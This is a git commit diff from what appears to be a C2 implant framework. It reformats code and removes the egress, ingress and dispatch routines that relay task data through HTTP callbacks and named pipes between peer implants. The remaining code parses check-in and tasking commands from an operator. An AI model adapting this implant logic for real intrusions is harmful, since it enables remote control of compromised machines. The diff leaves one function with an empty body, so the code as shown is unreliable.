ab28b28953d2681d6c3fbdc63a33746665071fe0
1emvr <lemur.proxymslns@outlook.com>
2025-11-11 01:31:28 -0500

    BOFs will now be purely RVM exectuion. RVNI will include APIs that cannot be attained thru normal ELF execution. Native code exectuion will obviously still be supported.

--- core/src/dispatch.cpp
+++ core/src/dispatch.cpp
@@ -19,7 +19,6 @@ namespace Dispatcher {
             while (head->Next) {
                 head = head->Next;
             }
-
             head->Next = packet;
         }
     }
@@ -30,7 +29,6 @@ namespace Dispatcher {
         if (!Ctx->MessageCache || !target) {
             return;
         }
-
         for (auto head = Ctx->MessageCache; head; head = head->Next) {
             if (head == target) {
                 if (prev) {
@@ -58,8 +56,8 @@ namespace Dispatcher {
         UINT32 cbSeg  = 0;
         UINT32 index  = 1;
 
-        const auto nSeg        = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
-        constexpr auto mMax    = MESSAGE_MAX - SEGMENT_HEADER_SIZE;
+        const auto nSeg 	= (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
+        constexpr auto mMax = MESSAGE_MAX - SEGMENT_HEADER_SIZE;
 
         while (length > 0) {
             cbSeg = length > mMax ? mMax : length;
@@ -85,100 +83,21 @@ namespace Dispatcher {
         }
     }
 
-    VOID PrepareEgress(_stream *out) {
-        HEXANE;
-
-        _parser parser = { };
-
-        for (auto head = ctx->transport.message_queue; head; head = head->next) {
-            if (head->buffer) {
-                CreateParser(&parser, B_PTR(head->buffer), head->length);
-
-                PackUint32(out, head->peer_id);
-                PackUint32(out, head->task_id);
-                PackUint32(out, head->type);
-
-                ROOT_NODE 
-                    ? PackBytes(out, B_PTR(head->buffer), head->length)
-                    : AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);
-
-                break;
-            }
-        }
-
-        DestroyParser(&parser);
-    }
-
-    VOID PrepareIngress(_stream *in) {
-        HEXANE;
-
-        if (in) {
-            if (PeekPeerId(in) != ctx->session.peer_id) {
-                MessageQueue(in);
-            }
-            else {
-                CommandDispatch(in);
-            }
-        }
-        else {
-            auto head = ctx->transport.message_queue;
-            while (head) {
-                head->ready = FALSE;
-                head = head->next;
-            }
-        }
-    }
-
     BOOL DispatchRoutine() {
-        BOOL success = false;
-        PACKET *out = CreateStream();
-        PACKET *in = { };
-
-    retry:
-        if (!ctx->transport.message_queue) {
-            if (ROOT_NODE) {
-                MessageQueue(CreateStreamWithHeaders(TypeTasking));
-                goto retry;
-            }
-            else {
-                return true;
-            }
-        }
-
-        PrepareEgress(out);
-
-        if (ROOT_NODE) {
-            if (!HttpCallback(&in, out)) {
-                goto defer;
-            }
-        }
-        else {
-            if (!PipeSend(out) || !PipeReceive(&in)) {
-                goto defer;
-            }
-        }
-
-        PrepareIngress(in);
-        PushPeers();
-
-		success = true;
-defer:
-        DestroyStream(out);
-        return success;
     }
 
-    VOID CommandDispatch (_stream *in) {
+    VOID CommandDispatch (PACKET* inPack) {
         PARSER parser = { };
 
-        CreateParser(&parser, B_PTR(in->buffer), in->length);
+        CreateParser(&parser, (PBYTE)inPack->MsgData, inPack->MsgLength);
         UnpackUint32(&parser);
 
-        auto task_id = UnpackUint32(&parser);
-        MemCopy(&ctx->session.current_taskid, &task_id, sizeof(uint32_t));
+        auto taskId = UnpackUint32(&parser);
+        MemCopy(&Ctx->Session.CurrentTaskId, &taskId, sizeof(UINT32));
 
         switch (UnpackUint32(&parser)) {
 		case TypeCheckin:
-			MemSet(&ctx->session.checkin, true, sizeof(bool));
+			MemSet(&Ctx->Session.CheckIn, true, sizeof(BOOL));
 			break;
 		case TypeTasking:
 			ExecuteCommand(parser);
